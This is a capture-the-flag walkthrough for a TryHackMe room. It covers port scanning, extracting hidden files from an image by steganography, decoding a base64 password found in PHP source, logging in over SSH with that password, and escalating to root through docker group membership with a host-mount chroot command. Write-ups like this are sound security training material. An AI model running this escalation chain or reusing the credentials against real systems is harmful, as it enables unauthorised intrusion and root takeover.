🛡️ TryHackMe Walkthrough – Full Detailed Writeup
📌 Overview

This challenge involved:

Steganography
File extraction
Code analysis
Credential reuse
Privilege escalation (Docker abuse)
🔍 Step 1: Initial Enumeration

We start with a scan:

nmap -sC -sV TARGET_IP
📤 Output:
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache

👉 This tells us:

Web server available → entry point
SSH available → possible login later
🌐 Step 2: Web Enumeration

Visit:

http://TARGET_IP

👉 Found an image (output.jpg)

Download it:

wget http://TARGET_IP/output.jpg
🖼️ Step 3: Image Analysis
Check metadata:
exiftool output.jpg

👉 Nothing useful found.

Check embedded files:
binwalk output.jpg
📤 Output:
JPEG image data

👉 No embedded file → move to stego

🔐 Step 4: Steganography

Extract hidden data:

steghide extract -sf output.jpg

👉 No password required → success

📤 Output:
wrote extracted data to "backup.zip"
📦 Step 5: Extract ZIP
unzip backup.zip

👉 Extracted:

source_code.php
🧠 Step 6: Analyze Source Code
cat source_code.php
🔍 Important part:
if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")

👉 This means:

Password is encoded in Base64
We need to decode it
🔓 Step 7: Decode Password
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
📤 Output:
!d0ntKn0wmYp@ssw0rd
🔑 Step 8: SSH Login
ssh anurodh@TARGET_IP

Password:

!d0ntKn0wmYp@ssw0rd
📤 Output:
anurodh@ip-xx:~$

👉 We got user shell ✅

🏁 Step 9: User Flag
ls
cat local.txt
📤 Output:
{USER-FLAG: ***************}
⚔️ Step 10: Privilege Escalation

Check groups:

id
📤 Output:
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

👉 User is in docker group 🚨

💀 Step 11: Docker Exploit

Run:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
📤 Output:
#

Check:

whoami
root

👉 Root access achieved 🎯

🏆 Step 12: Root Flag
cd /root
cat proof.txt
📤 Output:
{ROOT-FLAG: ***************}
🔥 Key Concepts Learned
🧠 Steganography

Hiding data inside images → extracted via steghide

🧠 Base64 Encoding

Used to hide password:

Encoded → IWQwbnRLbjB3bVlwQHNzdzByZA==
Decoded → !d0ntKn0wmYp@ssw0rd
🧠 Credential Reuse

Password from code → used for SSH login

🧠 Docker Privilege Escalation

Being in docker group = root access:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
🧨 Final Flags (Sanitized for GitHub)
USER FLAG: THM{***************}
ROOT FLAG: THM{***************}
📌 Conclusion

This challenge demonstrates a real-world attack chain:

Stego → File Extraction → Code Analysis → Credential Leak → SSH Access → Docker Exploit → Root
